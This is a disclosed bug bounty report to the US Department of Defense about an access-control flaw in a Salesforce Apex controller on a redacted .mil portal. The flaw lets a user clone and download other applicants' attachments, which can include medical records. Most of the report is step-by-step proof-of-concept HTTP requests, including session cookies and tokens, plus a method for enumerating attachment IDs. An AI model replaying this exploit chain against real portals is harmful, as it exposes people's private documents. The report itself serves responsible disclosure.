# Applicant security exam Attachments/Documents accessible through an IDOR/BAC on the custom Apex controller on https://█████.mil 

## Report Details
- **Report ID**: 2950536
- **URL**: https://hackerone.com/reports/2950536
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2025-01-20T16:46:59.322Z
- **Disclosed**: 2025-02-12T20:55:26.602Z

## Reporter
- **Username**: oxylis
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
Greetings DoD team,

I've uncovered a highly dangerous IDOR on the ██████████ portal.

An attacker can switch the ownership of any Attachment record submitted through the portal and access the files. These contain highly sensitive information as they include all materials/documentation submitted as part of the vetting procedures prior to visiting the █████, e.g. personal medical records. Potentially this might include internal attachments as well.

An attacker is able to exploit the following chain:

1. Generate/enumerate a list of Salesforce Attachment Id's. These are highly predictable: example methodology/script here: https://blog.hypn.za.net/2022/11/12/Hacking-Salesforce-backed-WebApps/.
2. Plug the generated list of Id's into the broken Apex controller (apex://ExAM.FileUploadController/ACTION$cloneAttachment), clone any Attachment record within the CRM and link it to a record they own (e.g. their own Contact). This gives read access to the record. 
3. Download the newly-linked Attachment as their own via a servlet/servlet.FileDownload?file=* request.

**IMPORTANT NOTE: unfortunately during testing inadvertent access was gained to a confidential record (https://██████████.mil/Portal██████████/servlet/servlet.FileDownload?file=00PRw000000MaT3MAK). Please remove the link to the test Contact as a matter of urgency. Apologies!**

## Impact

High-impact sensitive data leak.

## System Host(s)
██████.mil

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
#  Steps to reproduce/POC

1. Create a new ███████ request: https://███████.mil/Portal██████/s/████████-creation
2. After submitting the form, verify the account by following the link received in email (Welcome to Your ████████ Reservation Portal My████s Account...)
3. After changing the password and logging into ██████.mil/Portal████/s/, find any POST request with aura.token present in the HTTP traffic, e.g:

```
POST /Portal████████/s/sfsites/aura?r=1&ui-comm-runtime-components-aura-components-siteforce-controller.PubliclyCacheableAttributeLoader.getComponentAttributes=1 HTTP/2
Host: █████.mil
Cookie: renderCtx=%7B%22pageId%22%3A%22fec421fb-ebfc-431f-978d-a365adcfcb5c%22%2C%22schema%22%3A%22Published%22%2C%22viewType%22%3A%22Published%22%2C%22brandingSetId%22%3A%223c2a3bc4-0bc0-4c5c-8f55-7ae185109706%22%2C%22audienceIds%22%3A%226Au83000000003R%2C6Au83000000003M%22%7D; CookieConsentPolicy=0:1; LSKey-c$CookieConsentPolicy=0:1; BrowserId=oMjkwsU6Ee-I00kJsX5jcA; pctrk=206f938e-92be-4123-812c-7636ca87745f; oinfo=c3RhdHVzPUFDVElWRSZ0eXBlPTImb2lkPTAwRHQwMDAwMDAwUE16bg==; autocomplete=1; oid=00Dt0000000PMzn; sid=00Dt0000000PMzn!AQEAQOLKvWlH87RxyW9N_gumGxPew3nc7awAoLfDbhliBEaC6HRUyzcfI0buw465cwES7za7d6WuFGxuivxJhqW4_4bM5PjI; sid_Client=w000000E5Sr0000000PMzn; clientSrc=81.97.122.40; inst=APP_Rw; __Secure-has-sid=1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://█████.mil/Portal█████/s/
X-Sfdc-Page-Scope-Id: cb3e874d-dd6f-4459-8016-91cb97c034bb
X-Sfdc-Request-Id: 1650000000ce00391b
X-Sfdc-Page-Cache: 05da72b5c160b86c
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
X-B3-Traceid: bb38cda3039f713b
X-B3-Spanid: 2e48fc5f161b8aa4
X-B3-Sampled: 0
Content-Length: 1310
Origin: https://█████████.mil
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

message=%7B%22actions%22%3A%5B%7B%22id%22%3A%2294%3Ba%22%2C%22descriptor%22%3A%22serviceComponent%3A%2F%2Fui.comm.runtime.components.aura.components.siteforce.controller.PubliclyCacheableAttributeLoaderController%2FACTION%24getComponentAttributes%22%2C%22callingDescriptor%22%3A%22markup%3A%2F%2Fsiteforce%3ApageLoader%22%2C%22params%22%3A%7B%22viewOrThemeLayoutId%22%3A%22c2a69af8-e08e-4cc8-a677-d55b0ca0fa94%22%2C%22publishedChangelistNum%22%3A91%2C%22audienceKey%22%3A%22ClyOkxQ47tauZ_s9udPOFA%22%7D%2C%22version%22%3A%2262.0%22%2C%22storable%22%3Atrue%7D%5D%7D&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22eUNJbjV5czdoejBvRlA5OHpDU1dPd1pMVExBQkpJSlVFU29Ba3lmcUNLWlE5LjMyMC4y%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%221184_AgcTXn_6dZSShHXZ2PZsug%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Atrue%7D&aura.pageURI=%2FPortal██████%2Fs%2F&aura.token=eyJub25jZSI6Ilh5VUlXTVhkNmlMLVVVSGE4UHgtNVpYcXNHTExpcHh1VHpsdGY0ZUxMX0lcdTAwM2QiLCJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IntcInRcIjpcIjAwRFJ3MDAwMDAwMDAwMVwiLFwidlwiOlwiMDJHUncwMDAwMDAwMDNGXCIsXCJhXCI6XCJjYWltYW5zaWduZXJcIn0iLCJjcml0IjpbImlhdCJdLCJpYXQiOjE3MzczOTAwMTE5MTEsImV4cCI6MH0%3D..WK5LFyXjvujGvkxNWDVZyUQQsRhVRCcTD_hkWdulEWA%3D
```

4. Send the request to Repeater, modify as below and send. This will pull some info from your own Contact record. Save the Contact Id (003Rw000002SJcsIAG in my case)

```
POST /Portal█████/s/sfsites/aura?r=1&ui-comm-runtime-components-aura-components-siteforce-controller.PubliclyCacheableAttributeLoader.getComponentAttributes=1 HTTP/2
Host: █████.mil
Cookie: renderCtx=%7B%22pageId%22%3A%22fec421fb-ebfc-431f-978d-a365adcfcb5c%22%2C%22schema%22%3A%22Published%22%2C%22viewType%22%3A%22Published%22%2C%22brandingSetId%22%3A%223c2a3bc4-0bc0-4c5c-8f55-7ae185109706%22%2C%22audienceIds%22%3A%226Au83000000003R%2C6Au83000000003M%22%7D; CookieConsentPolicy=0:1; LSKey-c$CookieConsentPolicy=0:1; BrowserId=oMjkwsU6Ee-I00kJsX5jcA; pctrk=206f938e-92be-4123-812c-7636ca87745f; oinfo=c3RhdHVzPUFDVElWRSZ0eXBlPTImb2lkPTAwRHQwMDAwMDAwUE16bg==; autocomplete=1; oid=00Dt0000000PMzn; sid=00Dt0000000PMzn!AQEAQOLKvWlH87RxyW9N_gumGxPew3nc7awAoLfDbhliBEaC6HRUyzcfI0buw465cwES7za7d6WuFGxuivxJhqW4_4bM5PjI; sid_Client=w000000E5Sr0000000PMzn; clientSrc=81.97.122.40; inst=APP_Rw; __Secure-has-sid=1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://█████.mil/Portal█████████/s/
X-Sfdc-Page-Scope-Id: cb3e874d-dd6f-4459-8016-91cb97c034bb
X-Sfdc-Request-Id: 1650000000ce00391b
X-Sfdc-Page-Cache: 05da72b5c160b86c
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
X-B3-Traceid: bb38cda3039f713b
X-B3-Spanid: 2e48fc5f161b8aa4
X-B3-Sampled: 0
Content-Length: 1115
Origin: https://██████.mil
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

message={"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"Contact","layoutType":"FULL","pageSize":2000,"currentPage":0,"useTimeout":false,"getCount":false,"enableRowActions":false}}]}&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22eUNJbjV5czdoejBvRlA5OHpDU1dPd1pMVExBQkpJSlVFU29Ba3lmcUNLWlE5LjMyMC4y%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%221184_AgcTXn_6dZSShHXZ2PZsug%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Atrue%7D&aura.pageURI=%2FPortal██████████%2Fs%2F&aura.token=eyJub25jZSI6Ilh5VUlXTVhkNmlMLVVVSGE4UHgtNVpYcXNHTExpcHh1VHpsdGY0ZUxMX0lcdTAwM2QiLCJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IntcInRcIjpcIjAwRFJ3MDAwMDAwMDAwMVwiLFwidlwiOlwiMDJHUncwMDAwMDAwMDNGXCIsXCJhXCI6XCJjYWltYW5zaWduZXJcIn0iLCJjcml0IjpbImlhdCJdLCJpYXQiOjE3MzczOTAwMTE5MTEsImV4cCI6MH0%3D..WK5LFyXjvujGvkxNWDVZyUQQsRhVRCcTD_hkWdulEWA%3D
```

█████████

5. Modify the request again as below, setting the value of parentId as as your Contact Id extracted in previous step and attachmentId as 00PRw000000MaT3MAK:

```
POST /Portal█████████/s/sfsites/aura?r=1&ui-comm-runtime-components-aura-components-siteforce-controller.PubliclyCacheableAttributeLoader.getComponentAttributes=1 HTTP/2
Host: █████.mil
Cookie: renderCtx=%7B%22pageId%22%3A%22fec421fb-ebfc-431f-978d-a365adcfcb5c%22%2C%22schema%22%3A%22Published%22%2C%22viewType%22%3A%22Published%22%2C%22brandingSetId%22%3A%223c2a3bc4-0bc0-4c5c-8f55-7ae185109706%22%2C%22audienceIds%22%3A%226Au83000000003R%2C6Au83000000003M%22%7D; CookieConsentPolicy=0:1; LSKey-c$CookieConsentPolicy=0:1; BrowserId=oMjkwsU6Ee-I00kJsX5jcA; pctrk=206f938e-92be-4123-812c-7636ca87745f; oinfo=c3RhdHVzPUFDVElWRSZ0eXBlPTImb2lkPTAwRHQwMDAwMDAwUE16bg==; autocomplete=1; oid=00Dt0000000PMzn; sid=00Dt0000000PMzn!AQEAQOLKvWlH87RxyW9N_gumGxPew3nc7awAoLfDbhliBEaC6HRUyzcfI0buw465cwES7za7d6WuFGxuivxJhqW4_4bM5PjI; sid_Client=w000000E5Sr0000000PMzn; clientSrc=81.97.122.40; inst=APP_Rw; __Secure-has-sid=1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://███████.mil/Portal███████/s/
X-Sfdc-Page-Scope-Id: cb3e874d-dd6f-4459-8016-91cb97c034bb
X-Sfdc-Request-Id: 1650000000ce00391b
X-Sfdc-Page-Cache: 05da72b5c160b86c
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
X-B3-Traceid: bb38cda3039f713b
X-B3-Spanid: 2e48fc5f161b8aa4
X-B3-Sampled: 0
Content-Length: 999
Origin: https://███████.mil
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

message={"actions":[{"id":"20;a","descriptor":"apex://ExAM.FileUploadController/ACTION$cloneAttachment","callingDescriptor":"markup://ExAM:AssessmentViewer","params":{"attachmentId":"00PRw000000MaT3MAK","parentId":"003Rw000002SJcsIAG"},"version":null}]}&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22eUNJbjV5czdoejBvRlA5OHpDU1dPd1pMVExBQkpJSlVFU29Ba3lmcUNLWlE5LjMyMC4y%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%221184_AgcTXn_6dZSShHXZ2PZsug%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Atrue%7D&aura.pageURI=%2FPortal█████████%2Fs%2F&aura.token=eyJub25jZSI6Ilh5VUlXTVhkNmlMLVVVSGE4UHgtNVpYcXNHTExpcHh1VHpsdGY0ZUxMX0lcdTAwM2QiLCJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IntcInRcIjpcIjAwRFJ3MDAwMDAwMDAwMVwiLFwidlwiOlwiMDJHUncwMDAwMDAwMDNGXCIsXCJhXCI6XCJjYWltYW5zaWduZXJcIn0iLCJjcml0IjpbImlhdCJdLCJpYXQiOjE3MzczOTAwMTE5MTEsImV4cCI6MH0%3D..WK5LFyXjvujGvkxNWDVZyUQQsRhVRCcTD_hkWdulEWA%3D
```
█████

6. Modify request again and send, this time calling all accessible Attachment records. Note that a new file has just been cloned/created, copy the Id: 00PRw000000MbSLMA0.

```
POST /Portal████████/s/sfsites/aura?r=1&ui-comm-runtime-components-aura-components-siteforce-controller.PubliclyCacheableAttributeLoader.getComponentAttributes=1 HTTP/2
Host: ██████.mil
Cookie: renderCtx=%7B%22pageId%22%3A%22fec421fb-ebfc-431f-978d-a365adcfcb5c%22%2C%22schema%22%3A%22Published%22%2C%22viewType%22%3A%22Published%22%2C%22brandingSetId%22%3A%223c2a3bc4-0bc0-4c5c-8f55-7ae185109706%22%2C%22audienceIds%22%3A%226Au83000000003R%2C6Au83000000003M%22%7D; CookieConsentPolicy=0:1; LSKey-c$CookieConsentPolicy=0:1; BrowserId=oMjkwsU6Ee-I00kJsX5jcA; pctrk=206f938e-92be-4123-812c-7636ca87745f; oinfo=c3RhdHVzPUFDVElWRSZ0eXBlPTImb2lkPTAwRHQwMDAwMDAwUE16bg==; autocomplete=1; oid=00Dt0000000PMzn; sid=00Dt0000000PMzn!AQEAQOLKvWlH87RxyW9N_gumGxPew3nc7awAoLfDbhliBEaC6HRUyzcfI0buw465cwES7za7d6WuFGxuivxJhqW4_4bM5PjI; sid_Client=w000000E5Sr0000000PMzn; clientSrc=81.97.122.40; inst=APP_Rw; __Secure-has-sid=1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://████████.mil/Portal██████/s/
X-Sfdc-Page-Scope-Id: cb3e874d-dd6f-4459-8016-91cb97c034bb
X-Sfdc-Request-Id: 1650000000ce00391b
X-Sfdc-Page-Cache: 05da72b5c160b86c
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
X-B3-Traceid: bb38cda3039f713b
X-B3-Spanid: 2e48fc5f161b8aa4
X-B3-Sampled: 0
Content-Length: 1118
Origin: https://███.mil
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

message={"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"Attachment","layoutType":"FULL","pageSize":2000,"currentPage":0,"useTimeout":false,"getCount":false,"enableRowActions":false}}]}&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22eUNJbjV5czdoejBvRlA5OHpDU1dPd1pMVExBQkpJSlVFU29Ba3lmcUNLWlE5LjMyMC4y%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%221184_AgcTXn_6dZSShHXZ2PZsug%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Atrue%7D&aura.pageURI=%2FPortal████████%2Fs%2F&aura.token=eyJub25jZSI6Ilh5VUlXTVhkNmlMLVVVSGE4UHgtNVpYcXNHTExpcHh1VHpsdGY0ZUxMX0lcdTAwM2QiLCJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IntcInRcIjpcIjAwRFJ3MDAwMDAwMDAwMVwiLFwidlwiOlwiMDJHUncwMDAwMDAwMDNGXCIsXCJhXCI6XCJjYWltYW5zaWduZXJcIn0iLCJjcml0IjpbImlhdCJdLCJpYXQiOjE3MzczOTAwMTE5MTEsImV4cCI6MH0%3D..WK5LFyXjvujGvkxNWDVZyUQQsRhVRCcTD_hkWdulEWA%3D
```
████████

7. Insert the ID into URL as below (same session) and verify that file is accessible from your account:

https://█████.mil/Portal██████████/servlet/servlet.FileDownload?file=00PRw000000MbSLMA0


# Notes

To ease testing on your side, I am also attaching a list of Attachment Id's that I generated using the method mentioned in the beginning of the report.

Hope you find this report helpful - look forward to your feedback.

## Suggested Mitigation/Remediation Actions




## Attachments
No attachments
